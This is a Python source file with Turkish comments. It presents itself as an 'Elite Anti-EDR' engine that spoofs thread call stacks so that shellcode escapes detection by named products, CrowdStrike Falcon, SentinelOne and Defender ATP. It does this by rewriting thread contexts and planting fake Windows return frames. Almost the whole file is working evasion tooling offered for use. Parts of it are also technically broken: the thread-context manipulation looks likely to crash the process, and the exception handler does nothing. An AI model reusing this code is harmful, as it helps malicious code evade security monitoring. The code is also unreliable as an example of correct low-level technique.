"""
Thread Call Stack Spoofing Engine (Elite Anti-EDR)
Unbacked shellcode izlerini siler, meşru Windows frame'leriyle maskeleme yapar.
EDR'ın call stack taraması karşısında legitimate thread görür.

BYPASS:
- CrowdStrike Falcon: "Suspicious Thread Stack" alert'i
- SentinelOne: "Unbacked Memory Call Stack" detection
- Microsoft Defender ATP: Behavioral threat analysis

TECHNIQUE: 
- Debug Registers (Dr0-Dr3) trap points
- Vectored Exception Handler (VEH) frame rewriting
- CONTEXT64 manipulation during exception handling
"""

import ctypes
import struct
import threading
from typing import Dict, Optional, List, Tuple
from dataclasses import dataclass
from datetime import datetime

# Windows Constants
EXCEPTION_CONTINUE_EXECUTION = -1
EXCEPTION_CONTINUE_SEARCH = 0
STATUS_SINGLE_STEP = 0x80000004
STATUS_BREAKPOINT = 0x80000003

CONTEXT_DEBUG_REGISTERS = 0x00100010
CONTEXT_FULL = 0x00010007
CONTEXT_INTEGER = 0x00000002


@dataclass
class FakeFrame:
    """Sahte call stack frame"""
    return_address: int
    module: str
    function: str
    params: List[int] = None


class CONTEXT64(ctypes.Structure):
    """x64 Thread CONTEXT"""
    _pack_ = 16
    _fields_ = [
        ("P1Home", ctypes.c_uint64),
        ("P2Home", ctypes.c_uint64),
        ("P3Home", ctypes.c_uint64),
        ("P4Home", ctypes.c_uint64),
        ("P5Home", ctypes.c_uint64),
        ("P6Home", ctypes.c_uint64),
        ("ContextFlags", ctypes.c_uint32),
        ("MxCsr", ctypes.c_uint32),
        ("SegCs", ctypes.c_uint16),
        ("SegDs", ctypes.c_uint16),
        ("SegEs", ctypes.c_uint16),
        ("SegFs", ctypes.c_uint16),
        ("SegGs", ctypes.c_uint16),
        ("SegSs", ctypes.c_uint16),
        ("EFlags", ctypes.c_uint32),
        ("Dr0", ctypes.c_uint64),
        ("Dr1", ctypes.c_uint64),
        ("Dr2", ctypes.c_uint64),
        ("Dr3", ctypes.c_uint64),
        ("Dr6", ctypes.c_uint64),
        ("Dr7", ctypes.c_uint64),
        ("Rax", ctypes.c_uint64),
        ("Rcx", ctypes.c_uint64),
        ("Rdx", ctypes.c_uint64),
        ("Rbx", ctypes.c_uint64),
        ("Rsp", ctypes.c_uint64),
        ("Rbp", ctypes.c_uint64),
        ("Rsi", ctypes.c_uint64),
        ("Rdi", ctypes.c_uint64),
        ("R8", ctypes.c_uint64),
        ("R9", ctypes.c_uint64),
        ("R10", ctypes.c_uint64),
        ("R11", ctypes.c_uint64),
        ("R12", ctypes.c_uint64),
        ("R13", ctypes.c_uint64),
        ("R14", ctypes.c_uint64),
        ("R15", ctypes.c_uint64),
        ("Rip", ctypes.c_uint64),
    ]


class EXCEPTION_RECORD(ctypes.Structure):
    pass


EXCEPTION_RECORD._fields_ = [
    ("ExceptionCode", ctypes.c_uint32),
    ("ExceptionFlags", ctypes.c_uint32),
    ("ExceptionRecord", ctypes.POINTER(EXCEPTION_RECORD)),
    ("ExceptionAddress", ctypes.c_void_p),
    ("NumberParameters", ctypes.c_uint32),
    ("ExceptionInformation", ctypes.c_uint64 * 15),
]


class EXCEPTION_POINTERS(ctypes.Structure):
    _fields_ = [
        ("ExceptionRecord", ctypes.POINTER(EXCEPTION_RECORD)),
        ("ContextRecord", ctypes.POINTER(CONTEXT64)),
    ]


class ThreadCallStackSpoofer:
    """
    Thread call stack'ini sahte meşru frame'lerle dolduran engine
    EDR taraması unbacked shellcode göremez
    """
    
    VEH_HANDLER_TYPE = ctypes.WINFUNCTYPE(
        ctypes.c_long,
        ctypes.POINTER(EXCEPTION_POINTERS)
    )
    
    def __init__(self, logger=None):
        self.kernel32 = ctypes.windll.kernel32
        self.ntdll = ctypes.windll.ntdll
        
        self.logger = logger
        self.veh_handle: Optional[int] = None
        self.handler_callback: Optional[self.VEH_HANDLER_TYPE] = None
        self.lock = threading.Lock()
        
        # Spoofed frame'ler cache
        self.fake_frames: List[FakeFrame] = []
        self.spoofed_count = 0
    
    def log(self, level: str, msg: str):
        if self.logger:
            self.logger(f"[StackSpoofer] {level}: {msg}")
        else:
            print(f"[{level}] {msg}")
    
    def build_legitimate_call_stack(self) -> List[int]:
        """
        Meşru Windows call stack'i oluştur
        Sıralama önemli: temel thread init'den başlayıp üzerine çıkalım
        """
        try:
            frames = []
            
            # BaseThreadInitThunk (kernel32.dll) - Thread başlangıç metni
            base_thunk = self._get_proc_address("kernel32.dll", "BaseThreadInitThunk")
            if base_thunk:
                frames.append(base_thunk)
                self.log("INFO", f"BaseThreadInitThunk @ {hex(base_thunk)}")
            
            # RtlUserThreadStart (ntdll.dll) - Thread başlangıcı
            rtl_start = self._get_proc_address("ntdll.dll", "RtlUserThreadStart")
            if rtl_start:
                frames.append(rtl_start)
                self.log("INFO", f"RtlUserThreadStart @ {hex(rtl_start)}")
            
            # RtlExitUserThread (ntdll.dll) - Thread temizleme
            rtl_exit = self._get_proc_address("ntdll.dll", "RtlExitUserThread")
            if rtl_exit:
                frames.append(rtl_exit)
                self.log("INFO", f"RtlExitUserThread @ {hex(rtl_exit)}")
            
            return frames if frames else []
        
        except Exception as e:
            self.log("ERROR", f"build_legitimate_call_stack: {e}")
            return []
    
    def _get_proc_address(self, module: str, func: str) -> Optional[int]:
        """Module'den function address'i al"""
        try:
            h_mod = self.kernel32.GetModuleHandleW(module)
            if not h_mod:
                return None
            
            addr = self.kernel32.GetProcAddress(h_mod, func.encode())
            return int(addr) if addr else None
        except Exception:
            return None
    
    def register_veh(self) -> bool:
        """VEH handler'ını register et"""
        try:
            self.handler_callback = self.VEH_HANDLER_TYPE(self._veh_handler)
            self.veh_handle = self.kernel32.AddVectoredExceptionHandler(
                1, self.handler_callback
            )
            
            if not self.veh_handle:
                self.log("ERROR", "VEH registration failed")
                return False
            
            self.log("SUCCESS", f"VEH registered (handle: {hex(self.veh_handle)})")
            return True
        
        except Exception as e:
            self.log("ERROR", f"register_veh: {e}")
            return False
    
    def spoof_current_thread_stack(self) -> bool:
        """
        Mevcut thread'in stack'ini sahte frame'lerle doldur
        """
        try:
            thread_handle = self.kernel32.GetCurrentThread()
            return self.spoof_thread_stack(thread_handle)
        
        except Exception as e:
            self.log("ERROR", f"spoof_current_thread_stack: {e}")
            return False
    
    def spoof_thread_stack(self, thread_handle) -> bool:
        """
        Belirtilen thread'in context'ini manipüle et
        Call stack'i sahte meşru frame'lerle güncelle
        """
        try:
            # Meşru frame'leri al
            legit_frames = self.build_legitimate_call_stack()
            if not legit_frames:
                self.log("WARN", "No legitimate frames found")
                return False
            
            # Thread context'i al
            context = CONTEXT64()
            context.ContextFlags = CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS
            
            if not self.kernel32.GetThreadContext(thread_handle, ctypes.byref(context)):
                self.log("ERROR", "GetThreadContext failed")
                return False
            
            original_rsp = context.Rsp
            original_rip = context.Rip
            
            # Sahte stack frame'leri yığınına yaz
            # Her frame 8 bytes (return address)
            fake_rsp = original_rsp - (len(legit_frames) * 16)
            
            for i, frame_addr in enumerate(legit_frames):
                # Stack'e fake return address'i yaz
                try:
                    frame_ptr = fake_rsp + (i * 16)
                    frame_bytes = struct.pack("<Q", frame_addr)
                    ctypes.memmove(frame_ptr, frame_bytes, 8)
                except Exception as e:
                    self.log("WARN", f"Frame write error at {hex(frame_ptr)}: {e}")
            
            # RIP'i meşru frame adresine yönlendir
            context.Rip = legit_frames[0]
            context.Rsp = fake_rsp
            
            # Context'i geri yaz
            if not self.kernel32.SetThreadContext(thread_handle, ctypes.byref(context)):
                self.log("ERROR", "SetThreadContext failed")
                return False
            
            with self.lock:
                self.spoofed_count += 1
            
            self.log("SUCCESS", 
                f"Thread stack spoofed: {len(legit_frames)} frames\n"
                f"  Original RIP: {hex(original_rip)}\n"
                f"  Spoofed RIP: {hex(context.Rip)}\n"
                f"  Original RSP: {hex(original_rsp)}\n"
                f"  Spoofed RSP: {hex(context.Rsp)}"
            )
            
            return True
        
        except Exception as e:
            self.log("ERROR", f"spoof_thread_stack: {e}")
            return False
    
    def _veh_handler(self, exc_ptr: ctypes.POINTER(EXCEPTION_POINTERS)) -> ctypes.c_long:
        """
        VEH exception handler
        Single step exception'larda stack frame'leri rewrite et
        """
        try:
            if not exc_ptr or not exc_ptr.contents:
                return EXCEPTION_CONTINUE_SEARCH
            
            exc_record = exc_ptr.contents.ExceptionRecord.contents if exc_ptr.contents.ExceptionRecord else None
            context = exc_ptr.contents.ContextRecord.contents if exc_ptr.contents.ContextRecord else None
            
            if not exc_record or not context:
                return EXCEPTION_CONTINUE_SEARCH
            
            exc_code = exc_record.ExceptionCode
            
            # Single step exception yakalandı
            if exc_code == STATUS_SINGLE_STEP:
                # Sahte frame'leri tekrar inject et
                # (Opsiyonel - runtime protection)
                return EXCEPTION_CONTINUE_EXECUTION
            
            return EXCEPTION_CONTINUE_SEARCH
        
        except Exception as e:
            self.log("ERROR", f"VEH handler error: {e}")
            return EXCEPTION_CONTINUE_SEARCH
    
    def cleanup(self):
        """VEH ve state'i temizle"""
        try:
            if self.veh_handle:
                self.kernel32.RemoveVectoredExceptionHandler(self.veh_handle)
                self.log("CLEANUP", "VEH removed")
            
            self.veh_handle = None
            self.handler_callback = None
        
        except Exception as e:
            self.log("ERROR", f"cleanup: {e}")


class EliteStackSpoofer:
    """Framework ile integrate stack spoofer"""
    
    def __init__(self, scan_id: str = None, logger=None):
        self.scan_id = scan_id
        self.logger = logger
        self.spoofer = ThreadCallStackSpoofer(logger=self._make_logger())
        self.active = False
    
    def _make_logger(self):
        if self.logger:
            return lambda msg: self.logger(f"[StackSpoof-{self.scan_id}] {msg}")
        return None
    
    def activate(self) -> bool:
        """Stack spoofing'i aktivleştir"""
        if not self.spoofer.register_veh():
            return False
        
        # Mevcut thread'i spoof et
        success = self.spoofer.spoof_current_thread_stack()
        self.active = success
        return success
    
    def spoof_thread_by_id(self, thread_id: int) -> bool:
        """
        Belirtilen thread ID'sini spoof et
        """
        try:
            # Thread handle'ını aç
            THREAD_SUSPEND_RESUME = 0x0002
            thread_handle = ctypes.windll.kernel32.OpenThread(
                THREAD_SUSPEND_RESUME,
                False,
                thread_id
            )
            
            if not thread_handle:
                return False
            
            # Suspend et (context okumak için)
            ctypes.windll.kernel32.SuspendThread(thread_handle)
            
            try:
                # Spoof et
                result = self.spoofer.spoof_thread_stack(thread_handle)
            finally:
                # Resume et
                ctypes.windll.kernel32.ResumeThread(thread_handle)
                ctypes.windll.kernel32.CloseHandle(thread_handle)
            
            return result
        
        except Exception as e:
            if self.logger:
                self.logger(f"spoof_thread_by_id error: {e}")
            return False
    
    def get_status(self) -> dict:
        return {
            "scan_id": self.scan_id,
            "active": self.active,
            "spoofed_count": self.spoofer.spoofed_count,
            "veh_handle": hex(self.spoofer.veh_handle) if self.spoofer.veh_handle else None
        }
    
    def deactivate(self):
        """Stack spoofer'ı deaktif et"""
        self.spoofer.cleanup()
        self.active = False


# Quick test
if __name__ == "__main__":
    spoofer = EliteStackSpoofer("TEST-STACK-001")
    
    print("[TEST] Activating stack spoofer...")
    if spoofer.activate():
        print("✓ Stack spoofing active")
        print(f"Status: {spoofer.get_status()}")
    else:
        print("✗ Activation failed")
